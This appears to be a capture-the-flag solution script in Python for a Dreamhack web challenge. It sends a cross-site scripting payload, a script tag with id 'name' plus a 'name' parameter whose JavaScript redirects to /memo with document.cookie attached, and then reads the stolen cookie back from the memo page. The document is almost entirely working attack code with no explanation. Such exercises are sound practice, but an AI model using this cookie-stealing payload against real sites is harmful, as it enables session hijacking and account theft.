import requests

port = 17892
url_index = f"http://host3.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_memo = url_index + "memo"

param = {
    "param": '<script id="name"></script>',
    "name": "location.href='/memo?memo='+document.cookie //",
}

r = requests.post(url_flag, data=param)
r = requests.get(url_memo)
print(r.text)
